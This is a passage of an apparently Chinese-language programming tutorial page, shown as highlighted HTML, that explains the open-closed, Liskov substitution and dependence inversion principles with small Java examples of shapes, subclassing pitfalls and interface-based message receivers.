class="hljs-keyword">package</span> io.xtwoy.principle.ocp.improve;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Ocp</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">//使用看看存在的问题</span><br>      <span class="hljs-type">GraphicEditor</span> <span class="hljs-variable">graphicEditor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GraphicEditor</span>();<br>      graphicEditor.drawShape(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Rectangle</span>());<br>      graphicEditor.drawShape(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Circle</span>());<br>      graphicEditor.drawShape(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Triangle</span>());<br>      graphicEditor.drawShape(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OtherGraphic</span>());<br>   &#125;<br><br>&#125;<br><br><span class="hljs-comment">//这是一个用于绘图的类 [使用方]</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">GraphicEditor</span> &#123;<br>   <span class="hljs-comment">//接收Shape对象，调用draw方法</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">drawShape</span><span class="hljs-params">(Shape s)</span> &#123;<br>      s.draw();<br>   &#125;<br><br>   <br>&#125;<br><br><span class="hljs-comment">//Shape类，基类</span><br><span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shape</span> &#123;<br>   <span class="hljs-type">int</span> m_type;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">draw</span><span class="hljs-params">()</span>;<span class="hljs-comment">//抽象方法</span><br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Rectangle</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Shape</span> &#123;<br>   Rectangle() &#123;<br>      <span class="hljs-built_in">super</span>.m_type = <span class="hljs-number">1</span>;<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">draw</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; 绘制矩形 &quot;</span>);<br>   &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Circle</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Shape</span> &#123;<br>   Circle() &#123;<br>      <span class="hljs-built_in">super</span>.m_type = <span class="hljs-number">2</span>;<br>   &#125;<br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">draw</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; 绘制圆形 &quot;</span>);<br>   &#125;<br>&#125;<br><br><span class="hljs-comment">//新增画三角形</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Triangle</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Shape</span> &#123;<br>   Triangle() &#123;<br>      <span class="hljs-built_in">super</span>.m_type = <span class="hljs-number">3</span>;<br>   &#125;<br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">draw</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; 绘制三角形 &quot;</span>);<br>   &#125;<br>&#125;<br><br><span class="hljs-comment">//新增一个图形</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">OtherGraphic</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Shape</span> &#123;<br>   OtherGraphic() &#123;<br>      <span class="hljs-built_in">super</span>.m_type = <span class="hljs-number">4</span>;<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">draw</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; 绘制其它图形 &quot;</span>);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-里氏代换原则liskov-substitution-principle"><a class="markdownIt-Anchor" href="#2-里氏代换原则liskov-substitution-principle"></a> <strong>2、里氏代换原则（Liskov Substitution Principle）</strong></h2><p>里氏代换原则是面向对象设计的基本原则之一。 里氏代换原则中说，任何基类可以出现的地方，子类一定可以出现。LSP是继承复用的基石，只有当派生类可以替换掉基类，且软件单位的功能不受到影响时，基类才能真正被复用，而派生类也能够在基类的基础上增加新的行为。里氏代换原则是对开闭原则的补充。实现开闭原则的关键步骤就是抽象化，而基类与子类的继承关系就是抽象化的具体实现，所以里氏代换原则是对实现抽象化的具体步骤的规范。</p><ol><li><p>里氏替换原则(Liskov Substitution Principle)在 1988 年，由麻省理工学院的以为姓里的女士ᨀ 出的。</p></li><li><p>如果对每个类型为 T1 的对象 o1，都有类型为 T2 的对象 o2，使得以 T1 定义的所有程序 P 在所有的对象 o1 都代换成 o2 时，程序 P 的行为没有发生变化，那么类型 T2 是类型 T1 的子类型。<strong>换句话说，所有引用基类的地须能透明地使用其子类的对象</strong>。</p></li><li><p>在使用继承时，遵循里氏替换原则，在<strong>子类中尽量不要重写父类的方法</strong></p></li><li><p>里氏替换原则告诉我们，继承实际上让两个类耦合性增强了，在适当的情况下，可以通过<strong>聚合，组合，依赖 来解决问题</strong>。.</p></li></ol><blockquote><p>继承性的思考和说明</p></blockquote><ol><li><p>继承包含这样一层含义：父类中凡是已经实现好的方法，实际上是在设定规范和契约，虽然它不强制要求所有的子类必须遵循这些契约，但是如果子类对这些已经实现的方法任意修改，就会对整个继承体系造成破坏。</p></li><li><p><strong>继承在给程序设计带来便利的同时，也带来了弊端</strong>。比如使用继承会给程序带来<strong>侵入性</strong>，程序的可移植性降低，增加对象间的耦合性，如果一个类被其他的类所继承，则当这个类需要修改时，必须考虑到所有的子类，并且父类修改后，所有涉及到子类的功能都有可能产生故障</p></li><li><p>问题提 出：<strong>在编程中，如何正确的使用继承</strong>? =&gt; <strong>里氏替换</strong>原则</p></li></ol><h3 id="一个程序引出的问题和思考"><a class="markdownIt-Anchor" href="#一个程序引出的问题和思考"></a> 一个程序引出的问题和思考</h3><p><code>Liskov.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.principle.liskov;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Liskov</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-type">A</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">A</span>();<br>      System.out.println(<span class="hljs-string">&quot;11-3=&quot;</span> + a.func1(<span class="hljs-number">11</span>, <span class="hljs-number">3</span>));<br>      System.out.println(<span class="hljs-string">&quot;1-8=&quot;</span> + a.func1(<span class="hljs-number">1</span>, <span class="hljs-number">8</span>));<br><br>      System.out.println(<span class="hljs-string">&quot;-----------------------&quot;</span>);<br>      <span class="hljs-type">B</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">B</span>();<br>      System.out.println(<span class="hljs-string">&quot;11-3=&quot;</span> + b.func1(<span class="hljs-number">11</span>, <span class="hljs-number">3</span>));<span class="hljs-comment">//这里本意是求出11-3</span><br>      System.out.println(<span class="hljs-string">&quot;1-8=&quot;</span> + b.func1(<span class="hljs-number">1</span>, <span class="hljs-number">8</span>));<span class="hljs-comment">// 1-8</span><br>      System.out.println(<span class="hljs-string">&quot;11+3+9=&quot;</span> + b.func2(<span class="hljs-number">11</span>, <span class="hljs-number">3</span>));<br>      <br>      <br><br>   &#125;<br><br>&#125;<br><br><span class="hljs-comment">// A类</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span> &#123;<br>   <span class="hljs-comment">// 返回两个数的差</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">func1</span><span class="hljs-params">(<span class="hljs-type">int</span> num1, <span class="hljs-type">int</span> num2)</span> &#123;<br>      <span class="hljs-keyword">return</span> num1 - num2;<br>   &#125;<br>&#125;<br><br><span class="hljs-comment">// B类继承了A</span><br><span class="hljs-comment">// 增加了一个新功能：完成两个数相加,然后和9求和</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">A</span> &#123;<br>   <span class="hljs-comment">//这里，重写了A类的方法, 可能是无意识</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">func1</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> &#123;<br>      <span class="hljs-keyword">return</span> a + b;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">func2</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> &#123;<br>      <span class="hljs-keyword">return</span> func1(a, b) + <span class="hljs-number">9</span>;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="解决方法"><a class="markdownIt-Anchor" href="#解决方法"></a> 解决方法</h3><ol><li><p>我们发现原来运行正常的相减功能发生了错误。原因就是类 B 无意中重写了父类的方法，造成原有功能出现错误。在实际编程中，我们常常会通过重写父类的方法完成新的功能，这样写起来虽然简单，但整个继承体系的复用性会比较差。特别是运行多态比较频繁的时候</p></li><li><p>通用的做法是：<strong>原来的父类和子类都继承一个更通俗的基类</strong>，原有的继承关系去掉，采用<strong>依赖，聚合，组合</strong>等关系代替.</p></li><li><p>改进方案</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230108202856132.png" alt="image-20230108202856132" /></p><p><code>Liskov.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.principle.liskov.improve;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Liskov</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-type">A</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">A</span>();<br>      System.out.println(<span class="hljs-string">&quot;11-3=&quot;</span> + a.func1(<span class="hljs-number">11</span>, <span class="hljs-number">3</span>));<br>      System.out.println(<span class="hljs-string">&quot;1-8=&quot;</span> + a.func1(<span class="hljs-number">1</span>, <span class="hljs-number">8</span>));<br><br>      System.out.println(<span class="hljs-string">&quot;-----------------------&quot;</span>);<br>      <span class="hljs-type">B</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">B</span>();<br>      <span class="hljs-comment">//因为B类不再继承A类，因此调用者，不会再func1是求减法</span><br>      <span class="hljs-comment">//调用完成的功能就会很明确</span><br>      System.out.println(<span class="hljs-string">&quot;11+3=&quot;</span> + b.func1(<span class="hljs-number">11</span>, <span class="hljs-number">3</span>));<span class="hljs-comment">//这里本意是求出11+3</span><br>      System.out.println(<span class="hljs-string">&quot;1+8=&quot;</span> + b.func1(<span class="hljs-number">1</span>, <span class="hljs-number">8</span>));<span class="hljs-comment">// 1+8</span><br>      System.out.println(<span class="hljs-string">&quot;11+3+9=&quot;</span> + b.func2(<span class="hljs-number">11</span>, <span class="hljs-number">3</span>));<br>      <br>      <br>      <span class="hljs-comment">//使用组合仍然可以使用到A类相关方法</span><br>      System.out.println(<span class="hljs-string">&quot;11-3=&quot;</span> + b.func3(<span class="hljs-number">11</span>, <span class="hljs-number">3</span>));<span class="hljs-comment">// 这里本意是求出11-3</span><br>      <br><br>   &#125;<br><br>&#125;<br><br><span class="hljs-comment">//创建一个更加基础的基类</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Base</span> &#123;<br>   <span class="hljs-comment">//把更加基础的方法和成员写到Base类</span><br>&#125;<br><br><span class="hljs-comment">// A类</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Base</span> &#123;<br>   <span class="hljs-comment">// 返回两个数的差</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">func1</span><span class="hljs-params">(<span class="hljs-type">int</span> num1, <span class="hljs-type">int</span> num2)</span> &#123;<br>      <span class="hljs-keyword">return</span> num1 - num2;<br>   &#125;<br>&#125;<br><br><span class="hljs-comment">// B类继承了A</span><br><span class="hljs-comment">// 增加了一个新功能：完成两个数相加,然后和9求和</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Base</span> &#123;<br>   <span class="hljs-comment">//如果B需要使用A类的方法,使用组合关系</span><br>   <span class="hljs-keyword">private</span> <span class="hljs-type">A</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">A</span>();<br>   <br>   <span class="hljs-comment">//这里，重写了A类的方法, 可能是无意识</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">func1</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> &#123;<br>      <span class="hljs-keyword">return</span> a + b;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">func2</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> &#123;<br>      <span class="hljs-keyword">return</span> func1(a, b) + <span class="hljs-number">9</span>;<br>   &#125;<br>   <br>   <span class="hljs-comment">//我们仍然想使用A的方法</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">func3</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.a.func1(a, b);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h2 id="3-依赖倒转原则dependence-inversion-principle"><a class="markdownIt-Anchor" href="#3-依赖倒转原则dependence-inversion-principle"></a> <strong>3、依赖倒转原则（Dependence Inversion Principle）</strong></h2><ol><li><p>高层模块不应该依赖低层模块，二者都应该依赖其抽象</p></li><li><p><strong>抽象不应该依赖细节，细节应该依赖抽象</strong></p></li><li><p>依赖倒转(倒置)的中心思想是<strong>面向接口编程</strong></p></li><li><p>依赖倒转原则是基于这样的设计理念：相对于细节的多变性，抽象的东西要稳定的多。以抽象为基础搭建的架构比以细节为基础的架构要稳定的多。在 java 中，抽象指的是接口或抽象类，细节就是具体的实现类</p></li><li><p>使用<strong>接口或抽象类</strong>的目的是制定好<strong>规范</strong>，而不涉及任何具体的操作，把<strong>展现细节的任务交给他们的实现类</strong>去完成</p></li></ol><h3 id="实现方案-1-分析说明"><a class="markdownIt-Anchor" href="#实现方案-1-分析说明"></a> 实现方案 1 + 分析说明</h3><p><code>DependecyInversion.java</code></p>   <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.principle.inversion;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DependecyInversion</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>      person.receive(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Email</span>());<br>   &#125;<br><br>&#125;<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Email</span> &#123;<br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getInfo</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;电子邮件信息: hello,world&quot;</span>;<br>   &#125;<br>&#125;<br><br><span class="hljs-comment">//完成Person接收消息的功能</span><br><span class="hljs-comment">//方式1分析</span><br><span class="hljs-comment">//1. 简单，比较容易想到</span><br><span class="hljs-comment">//2. 如果我们获取的对象是 微信，短信等等，则新增类，同时Perons也要增加相应的接收方法</span><br><span class="hljs-comment">//3. 解决思路：引入一个抽象的接口IReceiver, 表示接收者, 这样Person类与接口IReceiver发生依赖</span><br><span class="hljs-comment">//   因为Email, WeiXin 等等属于接收的范围，他们各自实现IReceiver 接口就ok, 这样我们就符号依赖倒转原则</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">receive</span><span class="hljs-params">(Email email )</span> &#123;<br>      System.out.println(email.getInfo());<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="实现方案-2依赖倒转-分析说明"><a class="markdownIt-Anchor" href="#实现方案-2依赖倒转-分析说明"></a> 实现方案 2(依赖倒转) + 分析说明</h3><p><code>DependecyInversion.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.principle.inversion.improve;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DependecyInversion</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">//客户端无需改变</span><br>      <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>      person.receive(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Email</span>());<br>      <br>      person.receive(<span class="hljs-keyword">new</span> <span class="hljs-title class_">WeiXin</span>());<br>   &#125;<br><br>&#125;<br><br><span class="hljs-comment">//定义接口</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">IReceiver</span> &#123;<br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getInfo</span><span class="hljs-params">()</span>;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Email</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IReceiver</span> &#123;<br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getInfo</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;电子邮件信息: hello,world&quot;</span>;<br>   &#125;<br>&#125;<br><br><span class="hljs-comment">//增加微信</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">WeiXin</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IReceiver</span> &#123;<br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getInfo</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;微信信息: hello,ok&quot;</span>;<br>   &#125;<br>&#125;<br><br><span class="hljs-comment">//方式2</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>   <span class="hljs-comment">//这里我们是对接口的依赖</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">receive</span><span class="hljs-params">(IReceiver receiver )</span> &#123;<br>      System.out.println(receiver.getInfo());<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="依赖关系传递的三种方式和应用案例"><a class="markdownIt-Anchor" href="#依赖关系传递的三种方式和应用案例"></a> 依赖关系传递的三种方式和应用案例</h3><ol><li><p>接口传递</p><p>应用案例代码</p></li><li><p>构造方法传递</p><p>应用案例代码</p></li><li><p>setter 方式传递</p></li></ol><p><code>DependencyPass.java</code></p>   <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.principle.inversion.improve;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DependencyPass</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-type">ChangHong</span> <span class="hljs-variable">changHong</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChangHong</span>();<br><span class="hljs-comment">//    OpenAndClose openAndClose = new OpenAndClose();</span><br><span class="hljs-comment">//    openAndClose.open(changHong);</span><br>      <br>      <span class="hljs-comment">//通过构造器进行依赖传递</span><br><span class="hljs-comment">//    OpenAndClose openAndClose = new OpenAndClose(changHong);</span><br><span class="hljs-comment">//    openAndClose.open();</span><br>      <span class="hljs-comment">//通过setter方法进行依赖传递</span><br>      <span class="hljs-type">OpenAndClose</span> <span class="hljs-variable">openAndClose</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OpenAndClose</span>();<br>      openAndClose.setTv(changHong);<br>      openAndClose.open();<br><br>   &#125;<br><br>&#125;<br><br><span class="hljs-comment">// 方式1： 通过接口传递实现依赖</span><br><span class="hljs-comment">// 开关的接口</span><br><span class="hljs-comment">// interface IOpenAndClose &#123;</span><br><span class="hljs-comment">// public void open(ITV tv); //抽象方法,接收接口</span><br><span class="hljs-comment">// &#125;</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// interface ITV &#123; //ITV接口</span><br><span class="hljs-comment">// public void play();</span><br><span class="hljs-comment">// &#125;</span><br><span class="hljs-comment">// </span><br><span class="hljs-comment">// class ChangHong implements ITV &#123;</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// @Override</span><br><span class="hljs-comment">// public void play() &#123;</span><br><span class="hljs-comment">//    // TODO Auto-generated method stub</span><br><span class="hljs-comment">//    System.out.println(&quot;长虹电视机，打开&quot;);</span><br><span class="hljs-comment">// &#125;</span><br><span class="hljs-comment">//  </span><br><span class="hljs-comment">// &#125;</span><br><span class="hljs-comment">//// 实现接口</span><br><span class="hljs-comment">// class OpenAndClose implements IOpenAndClose&#123;</span><br><span class="hljs-comment">// public void open(ITV tv)&#123;</span><br><span class="hljs-comment">// tv.play();</span><br><span class="hljs-comment">// &#125;</span><br><span class="hljs-comment">// &#125;</span><br><br><span class="hljs-comment">// 方式2: 通过构造方法依赖传递</span><br><span class="hljs-comment">// interface IOpenAndClose &#123;</span><br><span class="hljs-comment">// public void open(); //抽象方法</span><br><span 